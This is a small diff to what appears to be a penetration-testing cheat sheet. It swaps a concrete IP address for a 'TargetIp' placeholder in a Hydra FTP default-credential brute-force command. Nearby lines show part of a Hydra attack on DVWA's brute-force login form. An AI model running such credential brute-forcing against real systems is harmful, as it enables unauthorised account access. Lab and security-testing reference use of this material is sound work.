@@ -113,7 +113,7 @@ hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclist
   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
 ```
 ```
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://212.147.79.4
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TargetIp
 ```
 # WORDLIST :
 ```
